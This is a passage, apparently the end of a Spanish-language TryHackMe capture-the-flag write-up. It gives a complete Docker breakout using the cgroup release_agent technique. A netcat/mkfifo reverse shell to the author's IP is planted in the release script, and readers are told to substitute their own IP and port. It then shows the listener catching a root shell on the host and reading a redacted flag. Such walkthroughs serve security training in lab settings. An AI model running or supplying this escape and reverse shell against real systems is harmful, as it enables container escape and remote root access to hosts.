`stty raw -echo; fg`

`xterm`

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.127.161 443 >/tmp/f" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

#### como ven he agregado una reverse shell pero ustedes cambiaran la ip por la suya tun0 y el puerto a su preferencia.
#### ejecutamos eso en la terminal y con eso ya tuvimos que poder salir de el docker 

```bash
➜  ~ nc -nlvp 443
listening on [any] 443 ...
connect to [10.18.127.161] from (UNKNOWN) [10.10.255.20] 33236
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
info.txt
snap
# cat info.txt
You were looking at the tree and it was clearly magical, but you could see that the farther you went from the root, the weaker the magical energy.
So the energy was clearly coming from the bottom, so you saw that the soil was soft, different from the rest of the cave, so you dug down.
After digging for some time, you realized that the root stopped getting thinner, in fact it was getting thicker and thicker.
Suddently the gravity started changing and you grabbed the nearest thing you could get a hold of, now what was up was down.
And when you looked up you saw the same tree, but now you can see the sun, you're finally in the outside.

Flag:THM{****************+*}
# 
```
## Creditos:

[![Twitter ~ @Darlez.Sec](https://twitter.com/DarlezSec)](https://twitter.com/DarlezSec)

[![Twitter ~ @spawmnc](https://twitter.com/spxwnmc)](https://twitter.com/spxwnmc)

[![Twitter ~ @Mora404](https://twitter.com/4M0R4)](https://twitter.com/4M0R4)
